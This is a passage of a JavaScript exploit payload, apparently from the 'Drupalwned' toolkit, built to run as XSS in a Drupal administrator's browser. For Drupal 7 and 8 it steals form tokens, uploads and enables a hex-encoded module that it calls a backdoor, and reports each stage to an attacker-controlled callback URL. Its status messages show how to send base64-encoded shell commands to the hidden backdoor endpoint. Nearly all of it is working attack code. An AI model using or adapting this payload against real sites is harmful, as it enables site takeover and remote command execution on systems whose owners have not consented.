                                "Host": Target + "admin",
                                "Module": "DPUploadTemplate.Drupal8()",
                                "Message": "ERROR: Stage 1 - (The user affected by XSS lacks access to the Admin Panel)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }

            } else {

                var _stage2 = new XMLHttpRequest();
                _stage2.open("GET", Target + "admin/modules/install", false);
                _stage2.send();

                // Extract form_build_id token
                var form_build_id = _stage2.responseText.match(/name="form_build_id" value="([^"]*)"/)[1];

                // Extract form_token token
                var form_token = _stage2.responseText.match(/name="form_token"\s+value="([^"]*)"/)[1];

                // Upload Template
                var blob = hexToBlob(HexFileContent);
                var boundary = "--nowak0x01";
                var formData = new FormData();
                formData.append("project_url", "");
                formData.append('files[project_upload]', new Blob([blob], { type: "application/gzip" }), Filename);
                formData.append("form_build_id", form_build_id);
                formData.append("form_token", form_token);
                formData.append("form_id", "update_manager_install_form");
                formData.append("op", "Continue");

                function hexToBlob(hexString) {
                    const arrayBuffer = new Uint8Array(hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16))).buffer;
                    return new Blob([arrayBuffer], { type: 'application/gzip' });
                }

                var _upload = new XMLHttpRequest();
                _upload.open("POST", Target + "admin/modules/install", false);
                _upload.send(formData);

                if (_upload.responseText.match("is already installed")) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "admin/modules/install",
                                    "Module": "DPUploadTemplate.Drupal8()",
                                    "Message": "[ERROR] Stage 2 - The Template " + TemplatePrefix + " is already present!",
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                    /*
                        Obs: I attempted to create a logic wherein, if the template already exists in the application, the script would automatically remove the existing template and replace it with the new template containing the backdoor. However, the application operates with a caching system, which hindered the exploitation process. It resulted in the application still indicating the presence of the template, even though the template had been deleted.
                    */

                } else {

                    var Batch = _upload.responseURL.match(/(?:\?|&)batch=(\d+)&id=(\d+)/)[1];
                    var ID = _upload.responseURL.match(/(?:\?|&)batch=(\d+)&id=(\d+)/)[2];

                    // confirm
                    var do_nojs = new XMLHttpRequest();
                    do_nojs.open("POST", Target + "core/authorize.php/core/authorize.php?batch=" + Batch + "&id=" + ID + "&op=do_nojs&op=do&_format=json", false);
                    do_nojs.send();

                    // finish
                    var finished = new XMLHttpRequest();
                    finished.open("GET", Target + "core/authorize.php/core/authorize.php?batch=" + Batch + "&id=" + ID + "&op=do_nojs&op=finished", false);
                    finished.send();

                    // Verify Upload Status
                    if (finished.responseText.match("Installation was completed successfully")) {

                        if (Callback) {
                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "admin/modules/install",
                                        "Module": "DPUploadTemplate.Drupal8()",
                                        "Message": "[Sucessful] Stage 2 - The Template " + TemplatePrefix + " has been uploaded!",
                                        "Date": new Date().toUTCString()
                                    }
                                )
                            );
                        }

                        // Activating
                        var _ = new XMLHttpRequest();
                        _.open("GET", Target + "admin/modules", false);
                        _.send();
                        var form_build_id = _.responseText.match(/name="form_build_id" value="([^"]*)"/)[1];
                        var form_token = _.responseText.match(/name="form_token"\s+value="([^"]*)"/)[1];

                        var activate = new XMLHttpRequest();
                        activate.open("POST", Target + "admin/modules", false);
                        activate.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        activate.send(
                            "modules%5B" + TemplatePrefix + "%5D%5Benable%5D=1" +
                            "&form_build_id=" + form_build_id +
                            "&form_token=" + form_token + "&form_id=system_modules&op=Install"
                        );

                        if (activate.responseText.match("has been enabled")) {

                            if (Callback) {
                                var _callback = new XMLHttpRequest();
                                _callback.open("POST", Callback, true);
                                _callback.send(
                                    JSON.stringify(
                                        {
                                            "Host": Target + "admin/modules",
                                            "Module": "DPUploadTemplate.Drupal8()",
                                            "Message": "[Sucessful] Stage 2 - The Template " + TemplatePrefix + " has been enabled!",
                                            "About": [
                                                "If you're utilizing the default Custom Analytics template included in the exploit, you can activate the backdoor functionality by accessing the designated endpoint '/b7b3c4328d3631fb7040cad205e15686'.",
                                                "To see examples, check: https://github.com/nowak0x01/Drupalwned",
                                                "",
                                                "# HTTP Request Example #",
                                                "POST /b7b3c4328d3631fb7040cad205e15686 HTTP/2",
                                                "Host: localhost",
                                                "Content-Type: application/x-www-form-urlencoded",
                                                "[\r\n]",
                                                "K189mD2j=cGFzc3RocnU=&OGa93dka=aWQ7dW5hbWUgLWE7aXAgYTtscyAtYWxo",
                                                ""
                                            ],
                                            "Date": new Date().toUTCString()
                                        }
                                    )
                                );
                            }

                        } else {

                            if (Callback) {
                                var _callback = new XMLHttpRequest();
                                _callback.open("POST", Callback, true);
                                _callback.send(
                                    JSON.stringify(
                                        {
                                            "Host": Target + "admin/modules",
                                            "Module": "DPUploadTemplate.Drupal8()",
                                            "Date": new Date().toUTCString(),
                                            "Message": "[UNKNOWN ERROR] Stage 2 - Cannot Enable the Template " + TemplatePrefix,
                                            "About": encodeURIComponent(activate.responseText)

                                        }
                                    )
                                );
                            }

                        }

                    } else {

                        if (Callback) {
                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "admin/modules/install",
                                        "Module": "DPUploadTemplate.Drupal8()",
                                        "Date": new Date().toUTCString(),
                                        "Message": "[UNKNOWN ERROR] Stage 2 - ??????",
                                        "About": encodeURIComponent(_upload.responseText)
                                    }
                                )
                            );
                        }

                    }

                }

            }

        }

    }

    // Drupal 7.X.X (Upload Template)
    function Drupal7() {

        // The Contents of your .tar.gz template file encoded in Hex. (only change it if you are going to use another template than Hello World) -> Ex: xxd -p -c 0 [Template.tar.gz].
        var HexFileContent = "1f8b0800000000000003ed965f4fdb3010c0fb9c4f714388b4686a932669605d377580a6093690c69e10aadcc4a51e891dc50e6a35f1dd774ed2ac2b031e6048d3fc7b4965dfffbb5c1ae745469209e124592a16c95eebf971903008f4d30d0367fdb9a2e5fa81ef0e3cc7e9e3b9ebb9fda005c15f88e50e85542407c027cd1f967bf8fe1f25deecffe64137157191d0a7f8d00d1ef8fe7dfdc7b6074dff83fe00fb1f866ebf05ce7325f910ff79ffdfbecfe69965f576772dd8854f6996d0947225612ec4f5047f16ed4e17af7ad6ace0916282c3e684d452f0c302d8668aa6124640f29c2cdb9da1d51c5ed8d370ea45bed7df8bbd81e7cea6a1e33b1189fb4e40dd60b037b02f1b45d402b0155309b561f40eecc3d2298c574ee188c799605cd9af2bd98c5c518848924c49745de9dc09946ee89028a252a2cbaba24cba54ab0258dd45822bbcb23bb58a5a6655449f8fbe7c9b1c8c4f4e3e8c0f8ef565956b4e5591f33ae5a175db94f66c3d3e98891cd41c0f70fc440aabc01eabf44aaeae76af075f6954e44c2d810b45dfc0f99c49a00ba2fb08f853fba17111116d0feb9715792624952078b204c2e3ca8a9c8b2289b50d9852c0518f81712090e5f8f257b1507ec372c1759dba95d2d1027d2bc6af004788f199c0a844a9554c1316354961d6a8bed07e41522e996237181c2ae4691957b71c92a6362398124907fe24a69188697b7b7276faf5fcc23e76f7f6d3c3fe77fbb233d4fe0fe684634d75caa53ecadeab7bfa91ec7bf135f9b32e9bb5999454b59b203ab0b3b316d2ab116c6d55352fa5d7821de1559d3f4a349518a2e8edefa6319edaac8eb436d958aa05ca21a20ba6f4ecbcc0fbfff8fed7f93ccdc723fbdf717defd7f7dfd5dfffd0c34f82d9ff2f0027a97e6b36d7ab155319e52c2b5ffd118c578beace1aaefe1d74ad48e4da4ed85d58194eb35e762338c51597bfc4141b0c0683c16030180c0683c16030180c0683c16030180c0683e1278f6a6dd300280000";
        var TemplatePrefix = "drupal_analytics";
        var Filename = "drupal_analytics.tar.gz";

        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "admin", false);
        _stage1.send();

        if (_stage1.responseText) {

            // Verify if the User have access to Admin Panel
            if (_stage1.responseText.match("You are not authorized to access this page.")) {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "admin",
                                "Module": "DPUploadTemplate.Drupal7()",
                                "Message": "ERROR: Stage 1 - (The user affected by XSS lacks access to the Admin Panel)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }

            } else {

                var _stage2 = new XMLHttpRequest();
                _stage2.open("GET", Target + "admin/modules/install?render=overlay", false);
                _stage2.send();

                // Extract form_build_id token
                var form_build_id = _stage2.responseText.match(/name="form_build_id" value="([^"]*)"/)[1];

                // Extract form_token token
                var form_token = _stage2.responseText.match(/name="form_token"\s+value="([^"]*)"/)[1];

                // Upload Template
                var blob = hexToBlob(HexFileContent);
                var boundary = "--nowak0x01";
                var formData = new FormData();
                formData.append("project_url", "");
                formData.append('files[project_upload]', new Blob([blob], { type: "application/gzip" }), Filename);
                formData.append("form_build_id", form_build_id);
                formData.append("form_token", form_token);
                formData.append("form_id", "update_manager_install_form");
                formData.append("op", "Continue");

                function hexToBlob(hexString) {
                    const arrayBuffer = new Uint8Array(hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16))).buffer;
                    return new Blob([arrayBuffer], { type: 'application/gzip' });
                }

                var _upload = new XMLHttpRequest();
                _upload.open("POST", Target + "admin/modules/install?render=overlay&render=overlay", false);
                _upload.send(formData);

                if (_upload.responseText.match("is already installed")) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "admin/modules/install?render=overlay",
                                    "Module": "DPUploadTemplate.Drupal7()",
                                    "Message": "[ERROR] Stage 2 - The Template " + TemplatePrefix + " is already installed!",
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                    /*
                        Obs: I attempted to create a logic wherein, if the template already exists in the application, the script would automatically remove the existing template and replace it with the new template containing the backdoor. However, the application operates with a caching system, which hindered the exploitation process. It resulted in the application still indicating the presence of the template, even though the template had been deleted.
                    */

                } else {

                    var _start = _upload.responseText.match(/,"redirect":"(.*?)","refreshPage"/)[1];
                    _start = _start.replace(/\\/g, '');
                    _start = _start.replace(/u0026/g, '&');

                    var _ = new XMLHttpRequest();
                    _.open("GET", _start, false);
                    _.send();

                    alert(_.responseURL);
                    var Batch = _.responseURL.match(/[?&]batch=([^&]+)/)[1];
                    var ID = _.responseURL.match(/[?&]id=([^&]+)/)[1];

                    alert(Batch);
                    alert(ID);

                    var do_nojs = new XMLHttpRequest();
                    do_nojs.open("POST", Target + "authorize.php?batch=" + Batch + "&id=" + ID + "&op=do_nojs&op=do", false);
                    do_nojs.send();

                    // finish
                    var finished = new XMLHttpRequest();
                    finished.open("GET", Target + "authorize.php?batch=" + Batch + "&id=" + ID + "&op=do_nojs&op=finished", false);
                    finished.send();

                    // Verify Upload Status
                    if (finished.responseText.match("Installation was completed successfully")) {

                        if (Callback) {
                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "admin/modules/install",
                                        "Module": "DPUploadTemplate.Drupal7()",
                                        "Message": "[Sucessful] Stage 2 - The Template " + TemplatePrefix + " has been uploaded!",
                                        "Date": new Date().toUTCString()
                                    }
                                )
                            );
                        }

                        // Activating
                        var _ = new XMLHttpRequest();
                        _.open("GET", Target + "admin/modules", false);
                        _.send();
                        var form_build_id = _.responseText.match(/name="form_build_id" value="([^"]*)"/)[1];
                        var form_token = _.responseText.match(/name="form_token"\s+value="([^"]*)"/)[1];

                        var activate = new XMLHttpRequest();
                        activate.open("POST", Target + "admin/modules", false);
                        activate.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        activate.send(
                            "modules%5BCore%5D%5Bcolor%5D%5Benable%5D=1&modules%5BCore%5D%5Bcomment%5D%5Benable%5D=1&modules%5BCore%5D%5Bcontextual%5D%5Benable%5D=1&modules%5BCore%5D%5Bdashboard%5D%5Benable%5D=1&modules%5BCore%5D%5Bdblog%5D%5Benable%5D=1&modules%5BCore%5D%5Bfield_ui%5D%5Benable%5D=1&modules%5BCore%5D%5Bhelp%5D%5Benable%5D=1&modules%5BCore%5D%5Blist%5D%5Benable%5D=1&modules%5BCore%5D%5Bmenu%5D%5Benable%5D=1&modules%5BCore%5D%5Bnumber%5D%5Benable%5D=1&modules%5BCore%5D%5Boverlay%5D%5Benable%5D=1&modules%5BCore%5D%5Bpath%5D%5Benable%5D=1&modules%5BCore%5D%5Brdf%5D%5Benable%5D=1&modules%5BCore%5D%5Bsearch%5D%5Benable%5D=1&modules%5BCore%5D%5Bshortcut%5D%5Benable%5D=1&modules%5BCore%5D%5Btoolbar%5D%5Benable%5D=1&modules%5BCore%5D%5Bupdate%5D%5Benable%5D=1" +
                            "&modules%5BCustom%5D%5B" + TemplatePrefix + "%5D%5Benable%5D=1" +
                            "&form_build_id=" + form_build_id +
                            "&form_token=" + form_token +
                            "&form_id=system_modules&op=Save+configuration"
                        );

                        if (activate.responseText.match("The configuration options have been saved")) {

                            if (Callback) {
                                var _callback = new XMLHttpRequest();
                                _callback.open("POST", Callback, true);
                                _callback.send(
                                    JSON.stringify(
                                        {
                                            "Host": Target + "admin/modules",
                                            "Module": "DPUploadTemplate.Drupal7()",
                                            "Message": "[Sucessful] Stage 2 - The Template " + TemplatePrefix + " has been enabled!",
                                            "About": [
                                                "If you're utilizing the default Drupal Analytics template included in the exploit, you can activate the backdoor functionality by accessing the designated endpoint '/b7b3c4328d3631fb7040cad205e15686'.",
                                                "To see examples, check: https://github.com/nowak0x01/Drupalwned",
                                                "",
                                                "# HTTP Request Example #",
                                                "POST /b7b3c4328d3631fb7040cad205e15686 HTTP/2",
                                                "Host: localhost",
                                                "Content-Type: application/x-www-form-urlencoded",
                                                "[\r\n]",
                                                "K189mD2j=cGFzc3RocnU=&OGa93dka=aWQ7dW5hbWUgLWE7aXAgYTtscyAtYWxo",
                                                ""
                                            ],
                                            "Date": new Date().toUTCString()
                                        }
                                    )
                                );
                            }

                        } else {

                            if (Callback) {
                                var _callback = new XMLHttpRequest();
                                _callback.open("POST", Callback, true);
                                _callback.send(
                                    JSON.stringify(
                                        {
                                            "Host": Target + "admin/modules",
                                            "Module": "DPUploadTemplate.Drupal7()",
                                            "Date": new Date().toUTCString(),
                                            "Message": "[UNKNOWN ERROR] Stage 2 - Cannot Enable the Template " + TemplatePrefix,
                                            "About": encodeURIComponent(activate.responseText)

                                        }
                                    )
                                );
                            }

                        }

                    } else {

                        if (Callback) {
                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "admin/modules/install",
                                        "Module": "DPUploadTemplate.Drupal7()",
                                        "Date": new Date().toUTCString(),
                                        "Message": "[UNKNOWN ERROR] Stage 2 - ??????",
                                        "About": encodeURIComponent(_upload.responseText)
                                    }
                                )
                            );
                        }

                    }

                }

            }

        }

    }

}
